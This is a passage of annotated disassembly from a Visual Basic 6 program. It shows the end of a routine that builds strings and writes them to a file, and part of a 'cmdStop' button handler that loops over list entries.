0086F3A8: call 00410A18h ; &
0086F3AD: mov edx, eax
0086F3AF: lea ecx, var_000000B4
0086F3B5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F3BA: push eax
0086F3BB: push 00445568h
0086F3C0: call 00410A18h ; &
0086F3C5: mov edx, eax
0086F3C7: lea ecx, var_000000B8
0086F3CD: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F3D2: push eax
0086F3D3: push 00000010h
0086F3D5: pop eax
0086F3D6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F3DB: lea esi, var_00000460
0086F3E1: mov edi, esp
0086F3E3: movsd 
0086F3E4: movsd 
0086F3E5: movsd 
0086F3E6: movsd 
0086F3E7: push 00000001h
0086F3E9: push 00000010h
0086F3EB: push 00440E58h
0086F3F0: push 00000010h
0086F3F2: pop eax
0086F3F3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086F3F8: lea esi, var_00000450
0086F3FE: mov edi, esp
0086F400: movsd 
0086F401: movsd 
0086F402: movsd 
0086F403: movsd 
0086F404: push 00000001h
0086F406: push 00000000h
0086F408: push 00440E48h
0086F40D: push 00000000h
0086F40F: push 00000018h
0086F411: mov eax, [ebp+08h]
0086F414: mov eax, [eax]
0086F416: push [ebp+08h]
0086F419: call [eax+00000320h]
0086F41F: push eax
0086F420: lea eax, var_00000124
0086F426: push eax
0086F427: call 00410A84h ; Set (object)
0086F42C: push eax
0086F42D: lea eax, var_000002BC
0086F433: push eax
0086F434: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F439: add esp, 00000010h
0086F43C: push eax
0086F43D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F442: push eax
0086F443: lea eax, var_00000128
0086F449: push eax
0086F44A: call 00410A84h ; Set (object)
0086F44F: push eax
0086F450: lea eax, var_000002CC
0086F456: push eax
0086F457: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F45C: add esp, 00000020h
0086F45F: push eax
0086F460: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F465: push eax
0086F466: lea eax, var_0000012C
0086F46C: push eax
0086F46D: call 00410A84h ; Set (object)
0086F472: push eax
0086F473: lea eax, var_000002DC
0086F479: push eax
0086F47A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F47F: add esp, 00000020h
0086F482: push eax
0086F483: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086F488: mov edx, eax
0086F48A: lea ecx, var_000000BC
0086F490: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F495: push eax
0086F496: call 00410A18h ; &
0086F49B: mov edx, eax
0086F49D: lea ecx, var_000000C0
0086F4A3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F4A8: push eax
0086F4A9: push 00441264h ; vbCrLf
0086F4AE: call 00410A18h ; &
0086F4B3: mov edx, eax
0086F4B5: lea ecx, var_44
0086F4B8: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F4BD: lea eax, var_000000C0
0086F4C3: push eax
0086F4C4: lea eax, var_000000BC
0086F4CA: push eax
0086F4CB: lea eax, var_000000B8
0086F4D1: push eax
0086F4D2: lea eax, var_000000B4
0086F4D8: push eax
0086F4D9: lea eax, var_000000B0
0086F4DF: push eax
0086F4E0: lea eax, var_000000AC
0086F4E6: push eax
0086F4E7: lea eax, var_000000A8
0086F4ED: push eax
0086F4EE: lea eax, var_000000A4
0086F4F4: push eax
0086F4F5: lea eax, var_000000A0
0086F4FB: push eax
0086F4FC: lea eax, var_0000009C
0086F502: push eax
0086F503: lea eax, var_00000098
0086F509: push eax
0086F50A: lea eax, var_00000094
0086F510: push eax
0086F511: lea eax, var_00000090
0086F517: push eax
0086F518: lea eax, var_0000008C
0086F51E: push eax
0086F51F: lea eax, var_00000088
0086F525: push eax
0086F526: lea eax, var_00000084
0086F52C: push eax
0086F52D: lea eax, var_80
0086F530: push eax
0086F531: lea eax, var_7C
0086F534: push eax
0086F535: lea eax, var_78
0086F538: push eax
0086F539: lea eax, var_74
0086F53C: push eax
0086F53D: lea eax, var_70
0086F540: push eax
0086F541: lea eax, var_6C
0086F544: push eax
0086F545: lea eax, var_68
0086F548: push eax
0086F549: lea eax, var_64
0086F54C: push eax
0086F54D: lea eax, var_60
0086F550: push eax
0086F551: lea eax, var_5C
0086F554: push eax
0086F555: push 0000001Ah
0086F557: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086F55C: add esp, 0000006Ch
0086F55F: lea eax, var_0000012C
0086F565: push eax
0086F566: lea eax, var_00000128
0086F56C: push eax
0086F56D: lea eax, var_00000124
0086F573: push eax
0086F574: lea eax, var_00000120
0086F57A: push eax
0086F57B: lea eax, var_0000011C
0086F581: push eax
0086F582: lea eax, var_00000118
0086F588: push eax
0086F589: lea eax, var_00000114
0086F58F: push eax
0086F590: lea eax, var_00000110
0086F596: push eax
0086F597: lea eax, var_0000010C
0086F59D: push eax
0086F59E: lea eax, var_00000108
0086F5A4: push eax
0086F5A5: lea eax, var_00000104
0086F5AB: push eax
0086F5AC: lea eax, var_00000100
0086F5B2: push eax
0086F5B3: lea eax, var_000000FC
0086F5B9: push eax
0086F5BA: lea eax, var_000000F8
0086F5C0: push eax
0086F5C1: lea eax, var_000000F4
0086F5C7: push eax
0086F5C8: lea eax, var_000000F0
0086F5CE: push eax
0086F5CF: lea eax, var_000000EC
0086F5D5: push eax
0086F5D6: lea eax, var_000000E8
0086F5DC: push eax
0086F5DD: lea eax, var_000000E4
0086F5E3: push eax
0086F5E4: lea eax, var_000000E0
0086F5EA: push eax
0086F5EB: lea eax, var_000000DC
0086F5F1: push eax
0086F5F2: lea eax, var_000000D8
0086F5F8: push eax
0086F5F9: lea eax, var_000000D4
0086F5FF: push eax
0086F600: lea eax, var_000000D0
0086F606: push eax
0086F607: lea eax, var_000000CC
0086F60D: push eax
0086F60E: lea eax, var_000000C8
0086F614: push eax
0086F615: lea eax, var_000000C4
0086F61B: push eax
0086F61C: push 0000001Bh
0086F61E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086F623: add esp, 00000070h
0086F626: lea eax, var_000002DC
0086F62C: push eax
0086F62D: lea eax, var_000002CC
0086F633: push eax
0086F634: lea eax, var_000002BC
0086F63A: push eax
0086F63B: lea eax, var_000002AC
0086F641: push eax
0086F642: lea eax, var_0000029C
0086F648: push eax
0086F649: lea eax, var_0000028C
0086F64F: push eax
0086F650: lea eax, var_0000027C
0086F656: push eax
0086F657: lea eax, var_0000026C
0086F65D: push eax
0086F65E: lea eax, var_0000025C
0086F664: push eax
0086F665: lea eax, var_0000024C
0086F66B: push eax
0086F66C: lea eax, var_0000023C
0086F672: push eax
0086F673: lea eax, var_0000022C
0086F679: push eax
0086F67A: lea eax, var_0000021C
0086F680: push eax
0086F681: lea eax, var_0000020C
0086F687: push eax
0086F688: lea eax, var_000001FC
0086F68E: push eax
0086F68F: lea eax, var_000001EC
0086F695: push eax
0086F696: lea eax, var_000001DC
0086F69C: push eax
0086F69D: lea eax, var_000001CC
0086F6A3: push eax
0086F6A4: lea eax, var_000001BC
0086F6AA: push eax
0086F6AB: lea eax, var_000001AC
0086F6B1: push eax
0086F6B2: lea eax, var_0000019C
0086F6B8: push eax
0086F6B9: lea eax, var_0000018C
0086F6BF: push eax
0086F6C0: lea eax, var_0000017C
0086F6C6: push eax
0086F6C7: lea eax, var_0000016C
0086F6CD: push eax
0086F6CE: lea eax, var_0000015C
0086F6D4: push eax
0086F6D5: lea eax, var_0000014C
0086F6DB: push eax
0086F6DC: lea eax, var_0000013C
0086F6E2: push eax
0086F6E3: push 0000001Bh
0086F6E5: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086F6EA: add esp, 00000070h
0086F6ED: mov var_04, 00000025h
0086F6F4: lea eax, var_000004E8
0086F6FA: push eax
0086F6FB: lea eax, var_000004D8
0086F701: push eax
0086F702: lea eax, var_30
0086F705: push eax
0086F706: call 00410A36h ; Next
0086F70B: mov var_0000050C, eax
0086F711: cmp var_0000050C, 00000000h
0086F718: jnz 0086EB40h
0086F71E: mov var_04, 00000026h
0086F725: mov var_00000134, 80020004h
0086F72F: mov var_0000013C, 0000000Ah
0086F739: lea eax, var_0000013C
0086F73F: push eax
0086F740: call 004108C2h ; FreeFile
0086F745: mov var_000002F8, ax
0086F74C: mov var_00000300, 00000002h
0086F756: lea edx, var_00000300
0086F75C: lea ecx, var_40
0086F75F: call 00410922h ; msvbvm60.dll.__vbaVarMove
0086F764: lea ecx, var_0000013C
0086F76A: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086F76F: mov var_04, 00000027h
0086F776: lea eax, var_58
0086F779: push eax
0086F77A: call 00410862h ; msvbvm60.dll.__vbaStrVarCopy
0086F77F: mov edx, eax
0086F781: lea ecx, var_5C
0086F784: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086F789: push eax
0086F78A: lea eax, var_40
0086F78D: push eax
0086F78E: call 004109D0h ; msvbvm60.dll.__vbaI2Var
0086F793: push eax
0086F794: push FFFFFFFFh
0086F796: push 00000220h
0086F79B: call 004108B6h ; Open #
0086F7A0: lea ecx, var_5C
0086F7A3: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0086F7A8: mov var_04, 00000028h
0086F7AF: lea eax, var_40
0086F7B2: push eax
0086F7B3: call 004109D0h ; msvbvm60.dll.__vbaI2Var
0086F7B8: push eax
0086F7B9: lea eax, var_44
0086F7BC: push eax
0086F7BD: push 00000000h
0086F7BF: call 0041089Eh ; Put #
0086F7C4: mov var_04, 00000029h
0086F7CB: lea eax, var_40
0086F7CE: push eax
0086F7CF: call 004109D0h ; msvbvm60.dll.__vbaI2Var
0086F7D4: push eax
0086F7D5: call 00410898h ; Close #arg_1
0086F7DA: jmp 86F75Ah
0086F7DC: mov var_04, 0000002Ch
0086F7E3: push 00000000h
0086F7E5: push 00000003h
0086F7E7: push 00440E48h
0086F7EC: push 00000000h
0086F7EE: push 00000018h
0086F7F0: mov eax, [ebp+08h]
0086F7F3: mov eax, [eax]
0086F7F5: push [ebp+08h]
0086F7F8: call [eax+00000320h]
0086F7FE: push eax
0086F7FF: lea eax, var_000000C4
0086F805: push eax
0086F806: call 00410A84h ; Set (object)
0086F80B: push eax
0086F80C: lea eax, var_0000013C
0086F812: push eax
0086F813: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086F818: add esp, 00000010h
0086F81B: push eax
0086F81C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086F821: push eax
0086F822: lea eax, var_000000C8
0086F828: push eax
0086F829: call 00410A84h ; Set (object)
0086F82E: push eax
0086F82F: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086F834: add esp, 0000000Ch
0086F837: lea eax, var_000000C8
0086F83D: push eax
0086F83E: lea eax, var_000000C4
0086F844: push eax
0086F845: push 00000002h
0086F847: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086F84C: add esp, 0000000Ch
0086F84F: lea ecx, var_0000013C
0086F855: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086F85A: mov var_10, 00000000h
0086F861: wait 
0086F862: push 0086FB00h
0086F867: jmp 0086FAABh
0086F86C: lea eax, var_000000C0
0086F872: push eax
0086F873: lea eax, var_000000BC
0086F879: push eax
0086F87A: lea eax, var_000000B8
0086F880: push eax
0086F881: lea eax, var_000000B4
0086F887: push eax
0086F888: lea eax, var_000000B0
0086F88E: push eax
0086F88F: lea eax, var_000000AC
0086F895: push eax
0086F896: lea eax, var_000000A8
0086F89C: push eax
0086F89D: lea eax, var_000000A4
0086F8A3: push eax
0086F8A4: lea eax, var_000000A0
0086F8AA: push eax
0086F8AB: lea eax, var_0000009C
0086F8B1: push eax
0086F8B2: lea eax, var_00000098
0086F8B8: push eax
0086F8B9: lea eax, var_00000094
0086F8BF: push eax
0086F8C0: lea eax, var_00000090
0086F8C6: push eax
0086F8C7: lea eax, var_0000008C
0086F8CD: push eax
0086F8CE: lea eax, var_00000088
0086F8D4: push eax
0086F8D5: lea eax, var_00000084
0086F8DB: push eax
0086F8DC: lea eax, var_80
0086F8DF: push eax
0086F8E0: lea eax, var_7C
0086F8E3: push eax
0086F8E4: lea eax, var_78
0086F8E7: push eax
0086F8E8: lea eax, var_74
0086F8EB: push eax
0086F8EC: lea eax, var_70
0086F8EF: push eax
0086F8F0: lea eax, var_6C
0086F8F3: push eax
0086F8F4: lea eax, var_68
0086F8F7: push eax
0086F8F8: lea eax, var_64
0086F8FB: push eax
0086F8FC: lea eax, var_60
0086F8FF: push eax
0086F900: lea eax, var_5C
0086F903: push eax
0086F904: push 0000001Ah
0086F906: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086F90B: add esp, 0000006Ch
0086F90E: lea eax, var_0000012C
0086F914: push eax
0086F915: lea eax, var_00000128
0086F91B: push eax
0086F91C: lea eax, var_00000124
0086F922: push eax
0086F923: lea eax, var_00000120
0086F929: push eax
0086F92A: lea eax, var_0000011C
0086F930: push eax
0086F931: lea eax, var_00000118
0086F937: push eax
0086F938: lea eax, var_00000114
0086F93E: push eax
0086F93F: lea eax, var_00000110
0086F945: push eax
0086F946: lea eax, var_0000010C
0086F94C: push eax
0086F94D: lea eax, var_00000108
0086F953: push eax
0086F954: lea eax, var_00000104
0086F95A: push eax
0086F95B: lea eax, var_00000100
0086F961: push eax
0086F962: lea eax, var_000000FC
0086F968: push eax
0086F969: lea eax, var_000000F8
0086F96F: push eax
0086F970: lea eax, var_000000F4
0086F976: push eax
0086F977: lea eax, var_000000F0
0086F97D: push eax
0086F97E: lea eax, var_000000EC
0086F984: push eax
0086F985: lea eax, var_000000E8
0086F98B: push eax
0086F98C: lea eax, var_000000E4
0086F992: push eax
0086F993: lea eax, var_000000E0
0086F999: push eax
0086F99A: lea eax, var_000000DC
0086F9A0: push eax
0086F9A1: lea eax, var_000000D8
0086F9A7: push eax
0086F9A8: lea eax, var_000000D4
0086F9AE: push eax
0086F9AF: lea eax, var_000000D0
0086F9B5: push eax
0086F9B6: lea eax, var_000000CC
0086F9BC: push eax
0086F9BD: lea eax, var_000000C8
0086F9C3: push eax
0086F9C4: lea eax, var_000000C4
0086F9CA: push eax
0086F9CB: push 0000001Bh
0086F9CD: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086F9D2: add esp, 00000070h
0086F9D5: lea eax, var_000002DC
0086F9DB: push eax
0086F9DC: lea eax, var_000002CC
0086F9E2: push eax
0086F9E3: lea eax, var_000002BC
0086F9E9: push eax
0086F9EA: lea eax, var_000002AC
0086F9F0: push eax
0086F9F1: lea eax, var_0000029C
0086F9F7: push eax
0086F9F8: lea eax, var_0000028C
0086F9FE: push eax
0086F9FF: lea eax, var_0000027C
0086FA05: push eax
0086FA06: lea eax, var_0000026C
0086FA0C: push eax
0086FA0D: lea eax, var_0000025C
0086FA13: push eax
0086FA14: lea eax, var_0000024C
0086FA1A: push eax
0086FA1B: lea eax, var_0000023C
0086FA21: push eax
0086FA22: lea eax, var_0000022C
0086FA28: push eax
0086FA29: lea eax, var_0000021C
0086FA2F: push eax
0086FA30: lea eax, var_0000020C
0086FA36: push eax
0086FA37: lea eax, var_000001FC
0086FA3D: push eax
0086FA3E: lea eax, var_000001EC
0086FA44: push eax
0086FA45: lea eax, var_000001DC
0086FA4B: push eax
0086FA4C: lea eax, var_000001CC
0086FA52: push eax
0086FA53: lea eax, var_000001BC
0086FA59: push eax
0086FA5A: lea eax, var_000001AC
0086FA60: push eax
0086FA61: lea eax, var_0000019C
0086FA67: push eax
0086FA68: lea eax, var_0000018C
0086FA6E: push eax
0086FA6F: lea eax, var_0000017C
0086FA75: push eax
0086FA76: lea eax, var_0000016C
0086FA7C: push eax
0086FA7D: lea eax, var_0000015C
0086FA83: push eax
0086FA84: lea eax, var_0000014C
0086FA8A: push eax
0086FA8B: lea eax, var_0000013C
0086FA91: push eax
0086FA92: push 0000001Bh
0086FA94: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086FA99: add esp, 00000070h
0086FA9C: lea eax, var_000002E0
0086FAA2: push eax
0086FAA3: push 00000000h
0086FAA5: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0086FAAA: ret 
End Sub

Private sub cmdStop__86AECB
0086AECB: push ebp
0086AECC: mov ebp, esp
0086AECE: sub esp, 0000000Ch
0086AED1: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0086AED6: mov eax, fs:[00h]
0086AEDC: push eax
0086AEDD: mov fs:[00000000h], esp
0086AEE4: mov eax, 000000B8h
0086AEE9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086AEEE: push ebx
0086AEEF: push esi
0086AEF0: push edi
0086AEF1: mov var_0C, esp
0086AEF4: mov var_08, 0040D080h
0086AEFB: mov eax, [ebp+08h]
0086AEFE: and eax, 00000001h
0086AF01: mov var_04, eax
0086AF04: mov eax, [ebp+08h]
0086AF07: and al, FEh
0086AF09: mov [ebp+08h], eax
0086AF0C: mov eax, [ebp+08h]
0086AF0F: mov eax, [eax]
0086AF11: push [ebp+08h]
0086AF14: call [eax+04h]
0086AF17: cmp word ptr [008F2430h], FFFFh
0086AF1F: jnz 0086B2DFh
0086AF25: cmp [008F2010h], 00000000h
0086AF2C: jnz 86AF49h
0086AF2E: push 008F2010h
0086AF33: push 00433984h
0086AF38: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086AF3D: mov var_000000B8, 008F2010h
0086AF47: jmp 86AF53h
0086AF49: mov var_000000B8, 008F2010h
0086AF53: push 00000000h
0086AF55: push 00000001h
0086AF57: push 00440E48h
0086AF5C: push 00000000h
0086AF5E: push 00000018h
0086AF60: mov eax, var_000000B8
0086AF66: mov eax, [eax]
0086AF68: mov ecx, var_000000B8
0086AF6E: mov ecx, [ecx]
0086AF70: mov ecx, [ecx]
0086AF72: push eax
0086AF73: call [ecx+0000054Ch]
0086AF79: push eax
0086AF7A: lea eax, var_24
0086AF7D: push eax
0086AF7E: call 00410A84h ; Set (object)
0086AF83: push eax
0086AF84: lea eax, var_3C
0086AF87: push eax
0086AF88: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086AF8D: add esp, 00000010h
0086AF90: push eax
0086AF91: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086AF96: push eax
0086AF97: lea eax, var_28
0086AF9A: push eax
0086AF9B: call 00410A84h ; Set (object)
0086AFA0: push eax
0086AFA1: lea eax, var_4C
0086AFA4: push eax
0086AFA5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086AFAA: add esp, 00000010h
0086AFAD: push eax
0086AFAE: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086AFB3: mov var_000000A4, eax
0086AFB9: mov var_000000A0, 00000001h
0086AFC3: mov var_18, 00000001h
0086AFCA: lea eax, var_28
0086AFCD: push eax
0086AFCE: lea eax, var_24
0086AFD1: push eax
0086AFD2: push 00000002h
0086AFD4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086AFD9: add esp, 0000000Ch
0086AFDC: lea eax, var_4C
0086AFDF: push eax
0086AFE0: lea eax, var_3C
0086AFE3: push eax
0086AFE4: push 00000002h
0086AFE6: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086AFEB: add esp, 0000000Ch
0086AFEE: jmp 86B002h
0086AFF0: mov eax, var_18
0086AFF3: add eax, var_000000A0
0086AFF9: jo 0086B70Dh
0086AFFF: mov var_18, eax
0086B002: mov eax, var_18
0086B005: cmp eax, var_000000A4
0086B00B: jnle 0086B2DAh
0086B011: mov eax, var_18
0086B014: mov var_68, eax
0086B017: mov var_70, 00000003h
0086B01E: cmp [008F2010h], 00000000h
0086B025: jnz 86B042h
0086B027: push 008F2010h
0086B02C: push 00433984h
0086B031: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086B036: mov var_000000BC, 008F2010h
0086B040: jmp 86B04Ch
0086B042: mov var_000000BC, 008F2010h
0086B04C: push 00000000h
0086B04E: push 00000004h
0086B050: push 00440E58h
0086B055: push 00000010h
0086B057: pop eax
0086B058: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B05D: lea esi, var_70
0086B060: mov edi, esp
0086B062: movsd 
0086B063: movsd 
0086B064: movsd 
0086B065: movsd 
0086B066: push 00000001h
0086B068: push 00000000h
0086B06A: push 00440E48h
0086B06F: push 00000000h
0086B071: push 00000018h
0086B073: mov eax, var_000000BC
0086B079: mov eax, [eax]
0086B07B: mov ecx, var_000000BC
0086B081: mov ecx, [ecx]
0086B083: mov ecx, [ecx]
0086B085: push eax
0086B086: call [ecx+0000054Ch]
0086B08C: push eax
0086B08D: lea eax, var_24
0086B090: push eax
0086B091: call 00410A84h ; Set (object)
0086B096: push eax
0086B097: lea eax, var_3C
0086B09A: push eax
0086B09B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B0A0: add esp, 00000010h
0086B0A3: push eax
0086B0A4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B0A9: push eax
0086B0AA: lea eax, var_28
0086B0AD: push eax
0086B0AE: call 00410A84h ; Set (object)
0086B0B3: push eax
0086B0B4: lea eax, var_4C
0086B0B7: push eax
0086B0B8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B0BD: add esp, 00000020h
0086B0C0: push eax
0086B0C1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B0C6: push eax
0086B0C7: lea eax, var_2C
0086B0CA: push eax
0086B0CB: call 00410A84h ; Set (object)
0086B0D0: push eax
0086B0D1: lea eax, var_5C
0086B0D4: push eax
0086B0D5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B0DA: add esp, 00000010h
0086B0DD: push eax
0086B0DE: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0086B0E3: sub ax, FFFFh
0086B0E7: neg ax
0086B0EA: sbb eax, eax
0086B0EC: inc eax
0086B0ED: neg eax
0086B0EF: mov var_0000009C, ax
0086B0F6: lea eax, var_2C
0086B0F9: push eax
0086B0FA: lea eax, var_28
0086B0FD: push eax
0086B0FE: lea eax, var_24
0086B101: push eax
0086B102: push 00000003h
0086B104: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086B109: add esp, 00000010h
0086B10C: lea eax, var_5C
0086B10F: push eax
0086B110: lea eax, var_4C
0086B113: push eax
0086B114: lea eax, var_3C
0086B117: push eax
0086B118: push 00000003h
0086B11A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086B11F: add esp, 00000010h
0086B122: movsx eax, word ptr var_0000009C
0086B129: test eax, eax
0086B12B: jz 0086B2D5h
0086B131: mov eax, var_18
0086B134: mov var_68, eax
0086B137: mov var_70, 00000003h
0086B13E: cmp [008F2010h], 00000000h
0086B145: jnz 86B162h
0086B147: push 008F2010h
0086B14C: push 00433984h
0086B151: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086B156: mov var_000000C0, 008F2010h
0086B160: jmp 86B16Ch
0086B162: mov var_000000C0, 008F2010h
0086B16C: push 00000000h
0086B16E: push 00000014h
0086B170: push 00440E58h
0086B175: push 00000010h
0086B177: pop eax
0086B178: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B17D: lea esi, var_70
0086B180: mov edi, esp
0086B182: movsd 
0086B183: movsd 
0086B184: movsd 
0086B185: movsd 
0086B186: push 00000001h
0086B188: push 00000000h
0086B18A: push 00440E48h
0086B18F: push 00000000h
0086B191: push 00000018h
0086B193: mov eax, var_000000C0
0086B199: mov eax, [eax]
0086B19B: mov ecx, var_000000C0
0086B1A1: mov ecx, [ecx]
0086B1A3: mov ecx, [ecx]
0086B1A5: push eax
0086B1A6: call [ecx+0000054Ch]
0086B1AC: push eax
0086B1AD: lea eax, var_24
0086B1B0: push eax
0086B1B1: call 00410A84h ; Set (object)
0086B1B6: push eax
0086B1B7: lea eax, var_3C
0086B1BA: push eax
0086B1BB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B1C0: add esp, 00000010h
0086B1C3: push eax
0086B1C4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B1C9: push eax
0086B1CA: lea eax, var_28
0086B1CD: push eax
0086B1CE: call 00410A84h ; Set (object)
0086B1D3: push eax
0086B1D4: lea eax, var_4C
0086B1D7: push eax
0086B1D8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B1DD: add esp, 00000020h
0086B1E0: push eax
0086B1E1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B1E6: push eax
0086B1E7: lea eax, var_2C
0086B1EA: push eax
0086B1EB: call 00410A84h ; Set (object)
0086B1F0: push eax
0086B1F1: lea eax, var_5C
0086B1F4: push eax
0086B1F5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B1FA: add esp, 00000010h
0086B1FD: push eax
0086B1FE: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086B203: mov edx, eax
0086B205: lea ecx, var_1C
0086B208: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086B20D: push eax
0086B20E: call 004109DCh ; Val(arg_1)
0086B213: fstp real8 ptr var_00000098
0086B219: push 00000000h
0086B21B: push 00000000h
0086B21D: push 00000001h
0086B21F: push 00000000h
0086B221: lea eax, var_60
0086B224: push eax
0086B225: push 00000010h
0086B227: push 00000880h
0086B22C: call 00410946h ; ReDim
0086B231: add esp, 0000001Ch
0086B234: mov var_00000088, 00442930h
0086B23E: mov var_00000090, 00000008h
0086B248: lea esi, var_00000090
0086B24E: push 00000000h
0086B250: push var_60
0086B253: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0086B258: mov ecx, eax
0086B25A: mov edx, esi
0086B25C: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0086B261: mov edx, 0043D7C8h ; x79
0086B266: lea ecx, var_20
0086B269: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0086B26E: lea eax, var_60
0086B271: push eax
0086B272: lea eax, var_20
0086B275: push eax
0086B276: fld real8 ptr var_00000098
0086B27C: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0086B281: push eax
0086B282: call 007A6910h
0086B287: lea eax, var_60
0086B28A: push eax
0086B28B: push 00000000h
0086B28D: call 00410934h ; Erase
0086B292: lea eax, var_20
0086B295: push eax
0086B296: lea eax, var_1C
0086B299: push eax
0086B29A: push 00000002h
0086B29C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086B2A1: add esp, 0000000Ch
0086B2A4: lea eax, var_2C
0086B2A7: push eax
0086B2A8: lea eax, var_28
0086B2AB: push eax
0086B2AC: lea eax, var_24
0086B2AF: push eax
0086B2B0: push 00000003h
0086B2B2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086B2B7: add esp, 00000010h
0086B2BA: lea eax, var_5C
0086B2BD: push eax
0086B2BE: lea eax, var_4C
0086B2C1: push eax
0086B2C2: lea eax, var_3C
0086B2C5: push eax
0086B2C6: push 00000003h
0086B2C8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086B2CD: add esp, 00000010h
0086B2D0: call 0041096Ah ; DoEvents
0086B2D5: jmp 0086AFF0h
0086B2DA: jmp 0086B694h
0086B2DF: cmp [008F2010h], 00000000h
0086B2E6: jnz 86B303h
0086B2E8: push 008F2010h
0086B2ED: push 00433984h
0086B2F2: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086B2F7: mov var_000000C4, 008F2010h
0086B301: jmp 86B30Dh
0086B303: mov var_000000C4, 008F2010h
0086B30D: push 00000000h
0086B30F: push 00000001h
0086B311: push 00440E48h
0086B316: push 00000000h
0086B318: push 00000018h
0086B31A: mov eax, var_000000C4
0086B320: mov eax, [eax]
0086B322: mov ecx, var_000000C4
0086B328: mov ecx, [ecx]
0086B32A: mov ecx, [ecx]
0086B32C: push eax
0086B32D: call [ecx+00000550h]
0086B333: push eax
0086B334: lea eax, var_24
0086B337: push eax
0086B338: call 00410A84h ; Set (object)
0086B33D: push eax
0086B33E: lea eax, var_3C
0086B341: push eax
0086B342: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B347: add esp, 00000010h
0086B34A: push eax
0086B34B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B350: push eax
0086B351: lea eax, var_28
0086B354: push eax
0086B355: call 00410A84h ; Set (object)
0086B35A: push eax
0086B35B: lea eax, var_4C
0086B35E: push eax
0086B35F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B364: add esp, 00000010h
0086B367: push eax
0086B368: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086B36D: mov var_000000AC, eax
0086B373: mov var_000000A8, 00000001h
0086B37D: mov var_18, 00000001h
0086B384: lea eax, var_28
0086B387: push eax
0086B388: lea eax, var_24
0086B38B: push eax
0086B38C: push 00000002h
0086B38E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086B393: add esp, 0000000Ch
0086B396: lea eax, var_4C
0086B399: push eax
0086B39A: lea eax, var_3C
0086B39D: push eax
0086B39E: push 00000002h
0086B3A0: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086B3A5: add esp, 0000000Ch
0086B3A8: jmp 86B3BCh
0086B3AA: mov eax, var_18
0086B3AD: add eax, var_000000A8
0086B3B3: jo 0086B70Dh
0086B3B9: mov var_18, eax
0086B3BC: mov eax, var_18
0086B3BF: cmp eax, var_000000AC
0086B3C5: jnle 0086B694h
0086B3CB: mov eax, var_18
0086B3CE: mov var_68, eax
0086B3D1: mov var_70, 00000003h
0086B3D8: cmp [008F2010h], 00000000h
0086B3DF: jnz 86B3FCh
